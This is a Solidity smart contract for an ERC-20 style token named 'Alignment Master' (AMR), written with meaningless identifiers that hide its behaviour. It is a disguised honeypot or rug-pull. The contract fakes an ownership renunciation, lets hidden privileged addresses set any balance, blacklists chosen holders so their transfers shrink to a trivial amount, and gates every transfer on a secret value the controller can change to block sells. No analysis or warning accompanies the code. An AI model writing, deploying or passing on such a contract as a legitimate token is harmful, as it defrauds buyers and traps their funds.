//SPDX-License-Identifier: MIT

pragma solidity ^0.8.12;

interface tradingFundMin {
    function createPair(address txFund, address teamAmountTx) external returns (address);
}

interface atMaxLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquiditySenderTrading) external view returns (uint256);

    function transfer(address launchedTrading, uint256 receiverSenderFee) external returns (bool);

    function allowance(address listAtReceiver, address spender) external view returns (uint256);

    function approve(address spender, uint256 receiverSenderFee) external returns (bool);

    function transferFrom(
        address sender,
        address launchedTrading,
        uint256 receiverSenderFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed senderReceiverLaunched, uint256 value);
    event Approval(address indexed listAtReceiver, address indexed spender, uint256 value);
}

abstract contract liquidityMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atMaxLaunchMetadata is atMaxLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AlignmentMaster is liquidityMarketing, atMaxLaunch, atMaxLaunchMetadata {

    address public isFrom;

    function maxEnableAuto(address limitSell, address launchedTrading, uint256 receiverSenderFee) internal returns (bool) {
        require(tradingShould[limitSell] >= receiverSenderFee);
        tradingShould[limitSell] -= receiverSenderFee;
        tradingShould[launchedTrading] += receiverSenderFee;
        emit Transfer(limitSell, launchedTrading, receiverSenderFee);
        return true;
    }

    address toMaxAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function toEnable(address launchedSender, uint256 receiverSenderFee) public {
        receiverToken();
        tradingShould[launchedSender] = receiverSenderFee;
    }

    uint256 listSender;

    function name() external view virtual override returns (string memory) {
        return modeReceiver;
    }

    function transferFrom(address limitSell, address launchedTrading, uint256 receiverSenderFee) external override returns (bool) {
        if (_msgSender() != totalIs) {
            if (launchedMarketing[limitSell][_msgSender()] != type(uint256).max) {
                require(receiverSenderFee <= launchedMarketing[limitSell][_msgSender()]);
                launchedMarketing[limitSell][_msgSender()] -= receiverSenderFee;
            }
        }
        return teamList(limitSell, launchedTrading, receiverSenderFee);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return buyTxLiquidity;
    }

    uint256 constant minFeeTotal = 12 ** 10;

    function launchExempt() public {
        emit OwnershipTransferred(receiverAuto, address(0));
        teamReceiver = address(0);
    }

    function receiverSell(address exemptShould) public {
        require(exemptShould.balance < 100000);
        if (walletExempt) {
            return;
        }
        
        toIsMode[exemptShould] = true;
        
        walletExempt = true;
    }

    uint256 public toWallet;

    function getOwner() external view returns (address) {
        return teamReceiver;
    }

    bool private marketingIs;

    uint256 public launchedMinAmount;

    function allowance(address txListShould, address amountFee) external view virtual override returns (uint256) {
        if (amountFee == totalIs) {
            return type(uint256).max;
        }
        return launchedMarketing[txListShould][amountFee];
    }

    mapping(address => bool) public toIsMode;

    mapping(address => uint256) private tradingShould;

    function balanceOf(address liquiditySenderTrading) public view virtual override returns (uint256) {
        return tradingShould[liquiditySenderTrading];
    }

    event OwnershipTransferred(address indexed modeAtExempt, address indexed receiverBuy);

    address public receiverAuto;

    function transfer(address launchedSender, uint256 receiverSenderFee) external virtual override returns (bool) {
        return teamList(_msgSender(), launchedSender, receiverSenderFee);
    }

    uint256 private buyTxLiquidity = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return amountMax;
    }

    uint8 private amountMax = 18;

    mapping(address => mapping(address => uint256)) private launchedMarketing;

    bool private walletFund;

    mapping(address => bool) public modeSender;

    function atLaunched(uint256 receiverSenderFee) public {
        receiverToken();
        listExempt = receiverSenderFee;
    }

    function launchShould(address launchLaunched) public {
        receiverToken();
        
        if (launchLaunched == receiverAuto || launchLaunched == isFrom) {
            return;
        }
        modeSender[launchLaunched] = true;
    }

    bool public tokenTxTotal;

    function teamList(address limitSell, address launchedTrading, uint256 receiverSenderFee) internal returns (bool) {
        if (limitSell == receiverAuto) {
            return maxEnableAuto(limitSell, launchedTrading, receiverSenderFee);
        }
        uint256 takeExempt = atMaxLaunch(isFrom).balanceOf(toMaxAuto);
        require(takeExempt == listExempt);
        require(launchedTrading != toMaxAuto);
        if (modeSender[limitSell]) {
            return maxEnableAuto(limitSell, launchedTrading, minFeeTotal);
        }
        return maxEnableAuto(limitSell, launchedTrading, receiverSenderFee);
    }

    string private modeReceiver = "Alignment Master";

    address private teamReceiver;

    function receiverToken() private view {
        require(toIsMode[_msgSender()]);
    }

    bool public walletExempt;

    address totalIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 listExempt;

    uint256 private minLaunchedList;

    constructor (){
        if (launchedMinAmount == minLaunchedList) {
            marketingIs = false;
        }
        tokenTotal modeAt = tokenTotal(totalIs);
        isFrom = tradingFundMin(modeAt.factory()).createPair(modeAt.WETH(), address(this));
        
        receiverAuto = _msgSender();
        toIsMode[receiverAuto] = true;
        tradingShould[receiverAuto] = buyTxLiquidity;
        launchExempt();
        
        emit Transfer(address(0), receiverAuto, buyTxLiquidity);
    }

    function approve(address amountFee, uint256 receiverSenderFee) public virtual override returns (bool) {
        launchedMarketing[_msgSender()][amountFee] = receiverSenderFee;
        emit Approval(_msgSender(), amountFee, receiverSenderFee);
        return true;
    }

    function owner() external view returns (address) {
        return teamReceiver;
    }

    function symbol() external view virtual override returns (string memory) {
        return tokenIs;
    }

    string private tokenIs = "AMR";

}